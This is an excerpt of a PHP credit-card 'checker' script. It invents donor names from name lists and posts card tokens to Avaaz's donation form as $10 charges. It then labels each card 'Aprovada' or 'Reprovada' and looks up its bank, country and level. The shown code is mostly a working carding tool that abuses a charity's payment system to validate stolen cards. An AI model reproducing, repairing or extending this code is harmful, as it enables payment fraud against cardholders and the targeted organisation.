...
function dadosnome(){
	$nome = file("lista_nombres.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
	return $nome;
}
function dadossobre(){
	$sobrenome = file("lista_apellidos.txt");
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F&cid=3116&pa=0&lang=es&apiKey=&amount=10&currency=USD&amountOtherInput=&donationType=1&firstName='.$nome.'&lastName='.$sobrenome.'&Email='.$email.'&CountryID=81&zip=10001&Address=&city=&paymentType=creditcard&paymentFamily=cc&paymentCardType=&stripeToken='.$token.'&stripeGatewayId=30&supports_history_api=true&secure_validation=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&used_js=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&privacy_policy_text=%3Ca+href%3D%22https%3A%2F%2Fwww.avaaz.org%2Fes%2Fprivacy%22+target%3D%22_blank%22%3EAvaaz+proteger%C3%A1+tu+privacidad%3C%2Fa%3E+y+te+mantendr%C3%A1+al+corriente+de+esta+y+otras+campa%C3%B1as.&privacy_policy_version=');
$pagamento = curl_exec($ch);
...
$debitouu = $valores[mt_rand(0,9)];
 ...
 if (strpos($pagamento, 'Your card was declined.')) { 
 echo '<tr><td><font size="2"><font color="#0bbaee"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#F01005" size="1">Reprovada ✘</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#F01005" size="1">'.$debitouu.'</font></td><td><font size="1">#Unc3ns0r3d</font></td></tr>';
  }else if (strpos($pagamento, 'cvv')){
    $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);
...
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
 echo '<tr><td><font size="2"><font color="#00FF00"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#00FF00" size="1">Aprovada ✔ </font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#00FF00" size="1">'.$debitouu.'</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">#Unc3ns0r3d</font></td></tr>';
  }
curl_close($ch);
ob_flush();
echo $pagamento;
